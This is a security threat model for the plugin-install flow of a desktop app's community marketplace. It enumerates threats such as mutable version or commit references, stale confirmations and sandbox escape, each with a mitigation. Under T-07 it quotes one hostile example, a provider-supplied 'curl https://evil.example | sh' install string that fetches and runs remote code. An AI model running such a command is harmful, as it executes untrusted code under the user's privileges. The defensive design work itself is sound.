# DSH Community Market — Phase 4 Threat Model

> Status: **Awaiting Anywhere Labs security review**. Per `dsh-community-market-handoff.md` §14.5, Phase 4 implementation does not start until this threat model and its companion `security-test-table.md` are approved.
> Date: 2026-08-17
> Author: external team (Phase 0-3 maintainer)

## 1. Scope

### 1.1 In scope

The **install preview** path: from a user clicking "Install" on a plugin card through the moment `desktopPnpm.runPlugin(['add', target], ...)` is invoked. This includes:

- Identity resolution: turning a `CatalogSnapshotItem` into a precise npm spec or immutable repository reference
- Conflict detection: when an item declares both an npm package and a repository
- Confirmation binding: which source record, which item, which profile, which generation
- Lifecycle disclosure: warning the user that lifecycle scripts may execute

### 1.2 Out of scope (covered by other phases or upstream contracts)

- Network egress, DNS, redirect, body limits — covered by Phase 2 `RestrictedHttpClient` (§8.1)
- Renderer boundary, Bidi, control chars — covered by Phase 2 + Phase 3 Client (§8.2, §11.4)
- profile selection / restart — covered by `desktopProfiles` (Phase 5)
- Actual package mutation — covered by `desktopPnpm.runPlugin` contract (Phase 5)

### 1.3 Assets

| Asset | Sensitivity | Where |
|---|---|---|
| Current `desktopProfiles.current` identity | High (install target) | `desktopProfiles` service |
| A user-confirmed install binding (source + item + target + profile + generation + timestamp) | High (round-trip) | In-memory until `desktopPnpm` call |
| `enabled` and `order` on `LocalSourceRecord` | Medium (host-local user state) | `ctx.settings` namespace `dsh-community-market` |
| User's typed confirmation dialog content | High (UI surface) | Renderer only — no Node, no fs |

## 2. Trust boundaries

```
┌──────────────────────┐                  ┌─────────────────────┐
│  remote provider     │   HTTPS only     │  Host (this plugin) │
│  (untrusted)         │ ────────────────► │  - identity parsing │
│                      │                  │  - confirm binding  │
│  - vendor or         │                  │  - generation check │
│    attacker          │                  └──────────┬──────────┘
└──────────────────────┘                             │
                                                   │ apply(ctx, ...)
┌──────────────────────┐                             ▼
│  Local manifest       │   user-typed URL      ┌─────────────────────┐
│  URL                 │ ───────────────────► │  manifest fetch       │
│  (semi-trusted:       │                       │  - schema validate  │
│   user added)         │                       │  - identity derive  │
└──────────────────────┘                       └──────────┬──────────┘
                                                         │
┌──────────────────────┐                                │
│  Cordis runtime      │ ◄──────────────────────────────┘
│  (trusted: we trust  │  - ctx.provide('marketHost', ...)
│   the loader)        │  - ctx.effect() lifetime
└──────────────────────┘
                                                         │
                                                         ▼
                                                  ┌─────────────────────┐
                                                  │  desktopPnpm         │
                                                  │  runPlugin(...)       │
                                                  │  (Phase 5 contract)  │
                                                  └─────────────────────┘
```

The plugin **does not trust**:
- The remote provider's response fields (`name`, `summary`, `latestVersion`, `install`, ...)
- The provider URL — derived install target is computed locally
- User-typed URLs added via `POST /v1/market/sources` (validated via schema + `coerceRecordInput`)

The plugin **does trust**:
- The Cordis runtime to provide `desktopProfiles`, `desktopPnpm` services
- The `ctx.settings` service for persistence
- The `RestrictedHttpClient` to enforce §8.1 network invariants

## 3. Adversary model

| Actor | Capability | Motivation |
|---|---|---|
| Malicious provider operator | Controls a `https://...` response; can return any JSON; can rotate identifiers; can change response between page 1 and page 2 | Phishing, supply-chain, denial of wallet |
| Compromised provider account | Same as above, plus the ability to inject false provenance | Steal install slots from legitimate providers |
| Malicious upstream DSH user | Controls their own profile dir; can write `cordis.patch.yml` and `local node_modules` | Anything their own profile can do (out of scope — this is `desktopPnpm`'s contract) |
| Network MITM | Can intercept TCP if certificate validation is disabled | Should be impossible (HTTPS + cert validation enforced by `RestrictedHttpClient` §8.1) |
| Local untrusted code (Renderer) | None — Renderer is sandboxed | N/A |
| Concurrent same-user | Two install clicks within the same generation | Race; partial generation swap |

## 4. Threat enumeration

Threats are numbered `T-NN`. Each has: description, where it lands, primary impact, and the mitigations that close it. Mitigations reference the test table `security-test-table.md`.

### T-01 Mutable npm version reference

The provider returns `latestVersion: "1.2.0"` or `latestVersion: "latest"`. If we pass `["add", "1.2.0"]` to `desktopPnpm.runPlugin`, the version is interpreted at install time against the npm registry. An attacker who controls the provider can rotate `latestVersion` between user click and `desktopPnpm` invocation, causing the user to receive a different package than they confirmed.

**Landing point**: identity resolution, before the second confirmation.

**Impact**: Wrong package installed (supply-chain attack).

**Mitigation**:
- Parse `latestVersion` against `dist-tags` → exact SemVer only.
- Reject non-exact specifiers: ranges, tags, `latest`, `*`, `^`, `~`, dist-tags other than the locked `latest` (which we don't trust).
- If the provider's `latestVersion` is not a strict SemVer (per `catalog-snapshot.schema.json` `pattern` for npm package name + SemVer), disable the install button.
- Final spec passed to `desktopPnpm.runPlugin(['add', ...])` must be `name@version` with `version` matching `^[0-9]+\.[0-9]+\.[0-9]+(?:[-+][A-Za-z0-9.-]+)?$`.

### T-02 Mutable Git reference (default branch / mutable tag)

The provider returns `repository: { url: "https://github.com/o/r" }` without an `immutable` commit. If we pass this to `desktopPnpm`, the link target is resolved at install time. An attacker pushes a new commit between confirmation and install.

**Landing point**: identity resolution.

**Impact**: Wrong code installed (supply-chain attack).

**Mitigation**:
- Accept repository only if `immutable: { kind: "git-commit", sha: "<40 hex>" }` is present in the normalized item OR the item references an npm package via `package.repository + package.commit` mapping.
- Reject items with `repository` but no immutable reference; disable install.
- If both `package` and `repository` are declared with different SHAs, require explicit user choice (T-03).

### T-03 Conflicting package + repository identities

The provider declares both `package: { registry: "npm", name: "x" }` and `repository: { url: "https://..." }`. We cannot independently verify that the two point at the same code, especially with custom build processes. Silently preferring one is a hidden decision the user did not consent to.

**Landing point**: identity resolution.

**Impact**: User installs code under one identity while the provider claims another.

**Mitigation**:
- If both are declared: disable the install button. The confirmation dialog surfaces both identities and asks the user to pick.
- The user's choice is part of the `confirm` token; `desktopPnpm` is invoked with exactly what the user picked (never the other).

### T-04 Stale confirmation across profile / generation change

A user clicks Install on item I in profile P, generation G. Between the first confirmation and the second confirmation (or between the second and `desktopPnpm` invocation), the user switches profile or the runtime rotates generation (e.g. via `desktopProfiles.select`). The install would then proceed under the new profile / generation, even though the user confirmed under the old one.

**Landing point**: between the first confirm and `desktopPnpm` invocation.

**Impact**: Install lands in a profile the user did not consent to.

**Mitigation**:
- The confirm token binds `{ sourceRecordId, itemId, identityChoice, target, profile: { name, dir }, generationId, expiresAt }`.
- Just before invoking `desktopPnpm`, the Host re-reads `desktopProfiles.current` and the runtime generation. If either does not match the binding, refuse and surface a "stale confirmation" message.
- Token TTL: 30 seconds (default; not user-configurable in v1).

### T-05 Stale snapshot confirmation

User clicks Install on item I based on snapshot fetched at time T1. Between T1 and the confirm, the source updates the catalog. The user's confirm was for the older item, but the new one might have a different version or identity.

**Landing point**: between fetch and confirm.

**Impact**: Install under an outdated consent.

**Mitigation**:
- Each confirm binds `fetchedAt` from the snapshot source.
- The Host re-fetches the snapshot before invoking `desktopPnpm`. If `fetchedAt` differs, refuse and surface "snapshot was updated, please review again".
- Optionally show diff against current fetched item.

### T-06 Cursor reuse across sources / queries

Cursor C was issued by source S1 with query Q1. The aggregator tries to reuse C in a different source S2 or a different query Q2. The cursor's opaque payload may encode source-specific state; reusing it leaks S1's internals into S2.

**Landing point**: aggregator (Phase 2 M2.7).

**Impact**: Information leak between sources; potential bypass of per-source page boundaries.

**Mitigation**:
- `cursorBelongsTo` (Phase 2 M2.5) enforces length 1..2048.
- Aggregator (M2.7) must additionally tie cursors to `(sourceRecordId, supported, query)`; reject on mismatch. Phase 4 documents this requirement; the runtime check lands in Phase 5 when the cache participates in real fetches.

### T-07 Provider-supplied install command

Provider returns `install: "curl https://evil.example | sh"` in the snapshot. If the Host reads this and forwards to `desktopPnpm`, the user installs arbitrary code.

**Landing point**: identity resolution.

**Impact**: Arbitrary code execution.

**Mitigation**:
- `validateCatalogSnapshot` (Phase 2) already rejects `install`, `installCommand`, `script`, `command` as unknown fields on items (`additionalProperties: false` on item).
- The Host never reads these from the snapshot — install target is computed locally from `package.name@version` or `repository.url + commit`.
- Test: confirm `install` and `installCommand` never appear in the rendered confirm dialog.

### T-08 Lifecycle script execution without consent

`pnpm add <spec>` runs the package's `preinstall`, `install`, `postinstall` scripts. The user sees a confirmation dialog mentioning lifecycle risk, but the dialog may be skipped or buried.

**Landing point**: confirmation dialog.

**Impact**: Arbitrary code execution under the user's privileges (per `desktopPnpm` contract).

**Mitigation**:
- The confirmation dialog must include the explicit phrase "package 安装可能执行 lifecycle script" / "lifecycle scripts may run".
- The dialog must show the precise install target (`name@version` or `repo@commit`) the user is consenting to.
- Re-confirmation is mandatory before any package mutation; no auto-confirm on a single click.

### T-09 Generation lock lost during long confirmation

The user opens the confirmation dialog, walks away. The runtime rotates generation (e.g. settings update with `applies: 'restart'`). On return, the user clicks Confirm, but the generation is stale.

**Landing point**: confirm flow.

**Impact**: Same as T-04 (stale confirmation).

**Mitigation**: Same as T-04 (re-read on confirm). Additionally, the confirm token's `expiresAt` caps the confirmation lifetime.

### T-10 Render-time mutation of the snapshot

A bug in the Host's snapshot handling could re-fetch the snapshot between confirm and `desktopPnpm` invocation, accidentally substituting a different item. This is caught by the snapshot-freshness check (T-05).

**Landing point**: implementation error.

**Impact**: Same as T-05.

**Mitigation**: Code review + the T-05 check covers the runtime case; both must be present.

### T-11 Renderer asks Host to install with attacker-controlled target

The renderer is sandboxed (§8.2) and cannot directly call `desktopPnpm`. But it can submit a Host request. If the Host mistakenly trusts the renderer's choice of `target`, the renderer can install anything.

**Landing point**: confirm route handler.

**Impact**: Renderer escapes its sandbox.

**Mitigation**:
- The Host never accepts `target` from the client. The renderer submits `{ sourceRecordId, itemId, identityChoice: 'npm' | 'repository' }`. The Host looks up the item from its current snapshot and derives the target.
- The renderer's `target` field is ignored if present.

### T-12 Cursor leak in error messages

The Host's error responses include the cursor string for debugging. If the cursor encodes source-private state, leaking it across the renderer boundary reveals internal structure.

**Landing point**: error responses.

**Impact**: Information leak.

**Mitigation**:
- Errors return bounded `{ error: { reason, detail? } }` JSON.
- `detail` must not contain raw body / path / token / env / command. The cursor string IS surfaced (it's a user-visible pagination token) so that's not a leak in itself; but no internal state should be exposed.
- Test: error responses must not contain provider URLs or curl commands.

### T-13 Same-user concurrent installs

User clicks Install twice within the same generation, on two different items. Both confirms proceed in parallel. `desktopPnpm` has a single-operation gate per generation; one of them must wait or fail.

**Landing point**: confirm flow.

**Impact**: User sees a busy error for one; reasonable UX.

**Mitigation**:
- Per-`desktopPnpm` operation gate (already in the `desktopPnpm` contract).
- Phase 4 documents the UX expectation: the second click either queues behind the first or surfaces a "another install is in progress" message.
- No race-condition mitigation is needed in the Host itself; the gate is upstream.

## 5. Out-of-band mitigations

These are enforced by other phases but referenced here so reviewers see the full picture:

- §8.1 network matrix — Phase 2 `RestrictedHttpClient` (M2.1)
- §8.2 data + renderer boundary — Phase 2 schema + Phase 3 Client entry
- §8.3 install time-of-check — Phase 4 (this document) + Phase 5 `desktopPnpm` call

## 6. Acceptance criteria

The full security test table lives in `security-test-table.md`. It maps each threat T-NN to:

- A **denial condition** that the test must reproduce
- An **acceptance** that the implementation must meet
- A **test type**: unit / fixture / smoke / manual

The Headline: Phase 4 implementation must NOT begin until this threat model + its test table are approved.

## 7. Open questions for Labs

1. **Identity round-trip semantics**: should the install preview display the *exact* spec string passed to `desktopPnpm.runPlugin` (e.g. `dsh-plugin-better-sidebar@1.2.0`) and nothing else?
2. **Multi-package installs**: does v1 support installing multiple packages in one confirm, or one-at-a-time? v1 proposes one-at-a-time; bulk install would change the threat surface (T-04 becomes "any subset of items must remain valid").
3. **Identity aliasing**: a single `package.name` may resolve to multiple npm packages over time (deprecation, transfer). v1 proposes to require exact name match; alias resolution is out of scope.
4. **GenerationId source**: where does the runtime expose its current generation? We propose a `desktopGeneration` Cordis service (new); alternatively `desktopProfiles.current.generation` is acceptable. Labs picks.

These do not block the threat model but affect Phase 5 implementation choices.